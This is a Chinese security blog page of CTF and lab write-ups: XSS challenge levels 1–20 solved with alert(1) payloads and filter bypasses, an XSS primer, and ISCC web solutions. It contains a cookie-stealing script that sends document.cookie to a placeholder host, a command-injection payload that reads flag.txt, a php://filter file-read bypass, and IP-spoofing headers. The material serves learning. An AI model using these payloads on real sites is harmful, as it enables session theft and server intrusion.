<h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><p>这题目依旧是通过get型的方式来赋值，测试发现script关键词被过滤了，然后带有&lt;&gt;的标签必然在后面会跟着闭合标签&lt;/&gt;，而且空格被过滤了，我们可以这样构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;input%0Atype=&quot;button&quot;%0Aonclick=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<p>由于第一个标签网页自动跟上了一个结束的标签，中间我们直接构造了一个按钮点击即可触发onclick事件。最终源码被解析成了这样。<br><img src="../images/14/16.png" alt=""></p>
<h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>刚刚进入题目就发现了两个可疑的参数，具体如下：<br><img src="../images/14/17.png" alt=""><br>翻了翻源码发现它对应的是这个：<br><img src="../images/14/18.png" alt=""><br>接着测试的时候发现了一个问题就是无论怎么输入&lt;&gt;这两个都是没办法绕过过滤的，那只能通过直接在这里面构造事件来达到弹窗的目的，onclick一旦点击就跳转了，所以只能用一些只在当前页面触发的事件，比如onmouseover，onfocus，不过在测试时还发现了一点就是在参数后面加空格，才能把事件独立出来解析，所以payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=123&amp;arg02= onfocus=alert(1)</span><br></pre></td></tr></table></figure></p>
<p>点一下松开就行了。<br><strong>ps:弹窗了不会跳转，需要点击下面的那个链接</strong></p>
<h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>emmmmmmm…………<br>这题目和17一样啊，没搞懂什么意思。</p>
<h2 id="level-19-amp-amp-level-20"><a href="#level-19-amp-amp-level-20" class="headerlink" title="level 19 &amp;&amp; level 20"></a>level 19 &amp;&amp; level 20</h2><p>完全没头绪。。。。<br>真的做不出啊。。。。<br>之后学学js再回来做这道题目。</p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>之后xss题目还是会接着做，接下来要学学其他东西了。。。。还是太垃圾了。。<br><img src="../images/14/19.jpg" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjmni3xv6001hywve8menw45o" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-xss挑战赛的Payload(上)" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/10/xss挑战赛的Payload(上)/" class="article-date">
  <time class="post-time" datetime="2018-07-10T11:02:27.000Z" itemprop="datePublished">
    <span class="post-month">7月</span><br/>
    <span class="post-day">10</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/10/xss挑战赛的Payload(上)/">xss挑战赛的Payload(上)</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>日常开头，塔主在之前弄了一个XSS的专题，里面大致介绍了XSS攻击的一些要领以及给了我们一个XSS接收平台。，为了练习呢，有人推荐了这个<strong>xss.tv</strong>，里面有共计20道题目，所以我打算归纳一下Payload，随便总结一下bypass的思路。  </p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="../images/14/1.png" alt=""><br>打开XSS挑战赛的地址，发现第一题很明显是Get型的传参方式。试试最为基础的，也是作为测试的Payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>很容易过关跳转到第二关。</p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>审查元素<br><img src="../images/14/2.png" alt=""><br>发现输入的字符被嵌入进了<strong>value=””</strong>，可以考虑闭合构造弹出提示框，然后注释掉后面的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; //</span><br></pre></td></tr></table></figure></p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>测试一下发现在文本框输入<strong>‘</strong>是无法回显的，审查元素发现如下。<br><img src="../images/14/3.png" alt=""><br>针对这个为啥输入了一个’，源码就变成这样我还特地问了问前端狗大黄，这可能是浏览器的问题。我特地试试了几个不同的浏览器，发现输入相同，但是网站的源码并不一致，所以为了学好XSS，我就一直用一个特定的浏览器firefox。<br>接着测试一下’a’b确定输入的内容如何嵌入网站源码。<br><img src="../images/14/4.png" alt=""><br>那就照猫画虎构造Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onclick=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure>
<p>源码就变为了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(1)&gt;&apos;&apos;&quot;</span><br></pre></td></tr></table></figure>
<p>这里由于浏览器解析问题这一段就直接解析成了一个事件，点击一下文本框就弹窗了。<br><strong>PS:具体原理我也搞不懂是为啥，问了前端狗也无果</strong></p>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>这一题和上一题类似，就是把<strong>‘</strong>换成了<strong>“</strong>，试着输入Payload。<br><img src="../images/14/5.png" alt=""><br>发现回显出现了一个问题就是<strong>&gt;</strong>被吞了，既然这样我们可以试试实体编码<strong>&amp;gt</strong>来绕过。<br>点击文本框即可弹窗。  </p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>这题目多了一个难点就是on被强制转化为了o_n，就说明某些事件标签就不可以用了，但是可以换一个思路来构造xss的Payload，既然on不能用了，那我们试试a，href标签，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;clickme&lt;&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="../images/14/6.png" alt=""><br>发现a标签被解析了，只要点击后面的clickme就能执行javascript伪协议后面的内容。</p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>这一关相比较第五关就是过滤了href，目前过滤了on，script，href这三个关键词，我们可以尝试使用大小写来进行绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;sCript&gt;alert(1)&lt;/sCript&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p>
<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>这题目初步测试发现关键词on，script，src，href等关键词都被过滤了，无法回显我们输入的关键词，那么可以试试双写来绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p>
<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这一题过滤了很多东西，大写被自动转义成了小写，一些关键词中间都被强加了<strong>_</strong>，我们可以推测前端获取了信息返回给后端，后端是经过了一定处理的，所以呢，我们只要避开后端的检测就行了，这里可以使用实体编码来绕过，因为在后端是无法解析实体编码的，只有在前端页面才能进行解析，所以我们可以用实体编码来构造payload。<br>解决这个问题，再次观察题目发现我们输入的payload会被网页添加到<strong>a href</strong>标签中，所以我们最后的payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure></p>
<p><img src="../images/14/7.png" alt=""></p>
<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>说实话一开始我毫无头绪，测试了很多发现都无法改变友链的内容，知道看到解析才知道，原来合法链接的意思是要加上<strong>http://</strong>，这样就好构造了，把后面的<strong>http://</strong>注释掉就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)//http://</span><br></pre></td></tr></table></figure></p>
<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>点进去发现什么都没给,但查看源码发现<br><img src="../images/14/8.png" alt=""><br>输入框被隐藏了，所以可以直接通过get把参数传过去，不过在测试的时候发现只有<strong>t_sort</strong>这个参数传过去才能更改源码。<br>不过测试发现<strong>&lt;&gt;</strong>这个标签被过滤了，并且我在尝试使用<strong>&amp;lt,&amp;gt</strong>绕过时发现，不仅左右括号被吞了，连内容也被吞了，不过好在on有用，构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://daka.whaledu.com/xss/level10.php?t_sort=&quot; type=&quot;button&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure></p>
<p>最终的解析为<br><img src="../images/14/9.png" alt=""></p>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>由于考试周加上一些烦躁的事情要处理，博客没来得及更新，接下来博客会很勤的写。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/07/10/xss挑战赛的Payload(上)/" data-id="cjmni3xus0018ywvec8e92tox" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-关于xss的一些学习心得" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/06/01/关于xss的一些学习心得/" class="article-date">
  <time class="post-time" datetime="2018-06-01T10:26:17.000Z" itemprop="datePublished">
    <span class="post-month">6月</span><br/>
    <span class="post-day">01</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/01/关于xss的一些学习心得/">关于xss的一些学习心得</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>按照惯例，开头还是逼逼几句，本来这一篇我昨天就写好了，可是处理的时候不小心删了，所以就只能重新写一篇了，关于xss呢，很早之前就接触过但是一直没系统的学，只是为了做xss的题目而做题目所以这一次系统的归纳一下，也算是个备忘录吧。  </p>
<h2 id="何为XSS"><a href="#何为XSS" class="headerlink" title="何为XSS"></a>何为XSS</h2><p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。<strong>(摘自百度百科)</strong><br>以上的说明呢，是官方的。不过根据我的理解来说，XSS攻击是攻击者把构造的恶意代码插入到网页源码中，通过跳转，执行事件等方式来达到获取信息，执行恶意代码等目的。  </p>
<h2 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a>XSS攻击的分类</h2><p>一般来说XSS攻击分为三种。<br>第一种是反射型XSS，反射性XSS只是简单地把用户输入的数据”反射”给浏览器，也就是说攻击者必须让攻击点击所构造的恶意链接才能给攻击者反馈消息或者执行非本人意愿的命令。这一种反馈是即时性的，也是一次性的，也就是即输即用，也叫做”非持久型XSS”<br>第二种是储存型XSS，储存型XSS会把攻击者所构造的恶意代码储存到后端的数据库中，只要有用户一旦浏览到恶意代码的页面便会执行攻击的代码，被窃取登入验证等信息，攻击者便可以假冒”代表”用户进行操作。<br>第三种是基于Dom的XSS，这一种XSS攻击和反射型差不多，也算是反射型的一种，这种类型的攻击一般是攻击者构造一些事件，或者调用js里面一些函数来实现的，所以具体来说这种和第一种区分不算太大。  </p>
<h2 id="XSS一些Payload"><a href="#XSS一些Payload" class="headerlink" title="XSS一些Payload"></a>XSS一些Payload</h2><p>其实来说呢，xss的payload也不是类似sql注入一样固定的，xss的payload一般来说是变化多样，根据其html的代码来进行构造的。<br>这是最为基础，也是常用于测试的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">```  </span><br><span class="line">这里面包含了标签，也包含了alert()函数，一般来说是可以测试出一些东西的。  </span><br><span class="line">还有例如这种的payload</span><br></pre></td></tr></table></figure></p>
<p><img scr="#" onerror="alert(1)"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这种是通过构造一个错误，触发onerror事件弹出alert(1)。   </span><br><span class="line">还有类似这种</span><br></pre></td></tr></table></figure></p>
<p><script><br>var i=new Image;<br>i.src=”<a href="http://xxxx.xxxx.xxx&quot;+document.cookies">http://xxxx.xxxx.xxx&quot;+document.cookies</a>;<br></script><br><code>`</code><br>这种就是通过点击恶意链接，然后用户的信息就被窃取了。<br><strong>以上只是几种简单的Payload，其余的类型实在是太过复杂了，多做题目才能有更多的经验</strong>  </p>
<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>这个就大致说一下吧，之后会在练习中讲解一些的。主要分为以下几种。<br><strong>1 编码绕过</strong>根据网页过滤的代码，以及代码执行的环境进行合适的编码转化，例如他在后台过滤<strong>&lt;&gt;</strong>这个东西，那我们可以通过%3c%3e来绕过，也可以\0x3c来绕过。<br><strong>2 字符限制</strong>一般网页会限制输入的长度，我们可以进行简化代码，也可以直接更改源码中的maxlength要素来修改字符长度上限。<br><strong>3 使用标签</strong>灵活使用标签也是可以达到同样的效果的。<br>一些其他的方式也是需要在实战中进行磨练出来的，之后会写一篇XSS练习平台的wp，详细说一些思路。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/06/01/关于xss的一些学习心得/" data-id="cjmni3xux001aywve8re9ivop" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-XSS/">Web XSS</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-ISCC之Web的一些wp" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/25/ISCC之Web的一些wp/" class="article-date">
  <time class="post-time" datetime="2018-05-25T02:36:47.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">25</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/25/ISCC之Web的一些wp/">ISCCC Web的一些wp</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这是我第一次写wp，因为这次比赛挺简单的，我做的题目挺多的所以才写的这篇wp，像之前的那些偶尔爆零的比赛写出来丢人(这次写出来也挺丢人的)，web400之后总结再写，web300的注入真心不会。。</p>
<h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>发现有个输入框，f12查看源码发现要求输入的数字大于某个数，然而输入框限制了输入的长度，把maxlength改为999然后乱按一通就过了。  </p>
<h3 id="Web01"><a href="#Web01" class="headerlink" title="Web01"></a>Web01</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(&apos;2.php&apos;); </span><br><span class="line">$flag=&apos;&#123;***************&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;password&apos;])) &#123;   </span><br><span class="line">    if (strcmp($_GET[&apos;password&apos;], $flag) == 0)   </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);   </span><br><span class="line">    else   </span><br><span class="line">        print &apos;Invalid password&apos;;   </span><br><span class="line">&#125;   </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这题考察的是对strcmp()函数的理解，strcmp函数在对数组类的变量是会返回0的，在与其他变量比较时直接返回0，成功得到flag    </p>
<h3 id="为什么这么简单啊"><a href="#为什么这么简单啊" class="headerlink" title="为什么这么简单啊"></a>为什么这么简单啊</h3><p>打开网址发现了第一关的提示。<br><img src="../images/10/7.png" alt=""><br>从xxxx进入的意思大致是构造<strong>Referer:<a href="http://edu.xss.tv" target="_blank" rel="noopener">http://edu.xss.tv</a></strong>，ip构造为题目所要的就能进入第二关了。<br>发现页面跳转到了<strong>number2.php?token=260ca9dd8a4577fc00b7bd5810298076</strong>，第二关要求我们输入密码，提示了密码在哪，所以打开F12找密码。<br><img src="../images/10/8.png" alt=""><br>意外发现了password.js，那一串疑似base64的编码加上==号解码试试，果不其然就是密码了，把密码输进去flag到手。</p>
<h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>抓包，添加X-Forwarded-For：127.0.0.1，即可得到flag</p>
<h3 id="你能跨过去吗"><a href="#你能跨过去吗" class="headerlink" title="你能跨过去吗"></a>你能跨过去吗</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/NodeMore.jsp?id=672613&amp;page=2&amp;pageCounter=32&amp;undefined&amp;callback=%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_=1302746925413</span><br></pre></td></tr></table></figure>
<p>题目给了一个这个url，还有xss的提示，在url发现callback参数有问题，url解码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+/v+ +ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA+AC0-</span><br></pre></td></tr></table></figure></p>
<p>+/v+是utf-7编码格式，后面的base64得到<strong>&lt;�script&gt;alert(“key:/%nsfocusXSStest%/“)&lt;�/script&gt;</strong><br>把key输入文本框就能得到flag了  </p>
<h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>这道题目一开始还没做出来，后面捋捋思路发现还是挺有趣的，一道关于变量覆盖的题目。<br>首先找找有没有源码泄露，发现有个index.php.txt<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)</span><br><span class="line">	die(&quot;flag is here&quot;);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_POST as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>flag在$flag里面，然后要我们通过post传参使得输入的flag等于$flag里面的内容，但是我们并不知道flag是啥，仔细观察发现有<strong>$$</strong>一个东西，我们可以考虑变量覆盖来做。<br>进一步观察发现$_200这个变量是一定会输出的，而且里面的内容并不重要，而$flag在传参的时候会被覆盖，所以我们可以考虑把$flag的内容给$_200，而$flag我们可以通过post<strong>flag=flag</strong>构造来满足题目所要的<strong>$_POST[“flag”] !== $flag</strong><br>所以最终的构造为<img src="../images/10/1.png" alt="">  </p>
<h3 id="你能绕够吗"><a href="#你能绕够吗" class="headerlink" title="你能绕够吗"></a>你能绕够吗</h3><p>这道题目考察的是文件包含，进题目后随便点点发现了这个<br><img src="../images/10/2.png" alt=""><br>我们可以尝试一下<strong>?f=php://filter/read=convert.base64-encode/resource=index.php</strong><img src="../images/10/3.png" alt="">发现弹出一个error。很有可能把某个关键词给过滤了，试了试发现是php被过滤了，那尝试用大小写来绕过发现没有问题，但是并没有回显<img src="../images/10/4.png" alt="">我们一直index.php是存在的，其他的关键词也没被过滤，<strong>php</strong>这个关键词我们也用大小写绕过了，但是为什么还是读不出结果呢？这只剩下一种可能，由于在之前过滤了php，那很有可能后面又加上了php这个后缀，所以导致我们读不出，抱着希望尝试一下<strong>?f=Php://filter/read=convert.base64-encode/resource=index</strong>，结果出现了回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8dGl0bGU+5a+86Iiq6aG1PC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPC9oZWFkPgo8Ym9keT4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTEnPklEOiAxPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTInPklEOiAyPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTMnPklEOiAzPC9ocmVmPgogICAgPC9icj4KICAgIDxhIGhyZWY9J2luZGV4LnBocD9mPWFydGljbGVzJmlkPTQnPklEOiA0PC9ocmVmPgogICAgPC9icj4KPC9ib2R5Pgo8L2h0bWw+Cgo8P3BocAogICAgI0lTQ0N7TEZJT09PT09PT09PT09PT099CiAgICBpZihpc3NldCgkX0dFVFsnZiddKSl7CiAgICAgICAgaWYoc3RycG9zKCRfR0VUWydmJ10sInBocCIpICE9PSBGYWxzZSl7CiAgICAgICAgICAgIGRpZSgiZXJyb3IuLi4iKTsKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICAgaW5jbHVkZSgkX0dFVFsnZiddIC4gJy5waHAnKTsKICAgICAgICB9CiAgICB9CiAgICAKPz4KCg==</span><br></pre></td></tr></table></figure></p>
<p>base64解码后，发现flag  </p>
<h3 id="Web02"><a href="#Web02" class="headerlink" title="Web02"></a>Web02</h3><p>尝试XFF无果，再试着其他几个伪造ip。成功拿到flag<br>记录一下除了XFF可以伪造ip的HTTP头<br>Client-IP<br>x-remote-IP<br>x-originating-IP<br>x-remote-addr  </p>
<h3 id="请ping我的ip-看你能Ping通吗"><a href="#请ping我的ip-看你能Ping通吗" class="headerlink" title="请ping我的ip 看你能Ping通吗"></a>请ping我的ip 看你能Ping通吗</h3><p>这道题目我用扫描器扫了一下，发现有个flag.txt，直接读取flag。后面请教大手子-郁离歌师傅，才知道这里有另一种解法。<br>输入<strong>?ip=127.0.0.1%0a%20ls</strong>可以读取目录，然后再目录下发现flag.txt，<strong>ip=127.0.0.1%0a%20cat%20flag.txt</strong>读取flag.txt  </p>
<h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password"></a>Please give me username and password</h3><p>这种题目不给提示，那就试试源码泄露，发现index.php.txt存在，读取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;***********&quot;;</span><br><span class="line">if(isset($_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	$a = fla;</span><br><span class="line">	echo &quot;very good!Username is right&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">	print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;Please give me username or password!&apos;;</span><br><span class="line">if (isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">	if (is_numeric($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">		if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123;</span><br><span class="line">			if ($_GET[&apos;password&apos;] &gt; 999)&#123;</span><br><span class="line">			$b = g;</span><br><span class="line">			print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else </span><br><span class="line">			print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else</span><br><span class="line">		print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;else</span><br><span class="line">	print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b == &quot;flag&quot;)</span><br><span class="line">	print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到需要满足两个条件。第一，<strong>0 == strcasecmp($flag,$_GET[‘username’]</strong>这里我们可以通过数组来绕过，第二点，password长度小于4，但是他又要大于999，这里我们可以考虑用科学记数法，password=1e9就能大于999。所以最终payload为</p>
<blockquote>
<p>?username[]=1&amp;password=1e9     </p>
</blockquote>
<h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;); </span><br><span class="line">if(isset($_POST[&apos;username&apos;])&amp;isset($_POST[&apos;password&apos;]))&#123; </span><br><span class="line">    $username = $_POST[&apos;username&apos;]; </span><br><span class="line">    $password = $_POST[&apos;password&apos;]; </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $username=&quot;hello&quot;; </span><br><span class="line">    $password=&quot;hello&quot;; </span><br><span class="line">&#125; </span><br><span class="line">if(md5($password) == 0)&#123; </span><br><span class="line">    echo &quot;xxxxx&quot;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(__FILE__); </span><br><span 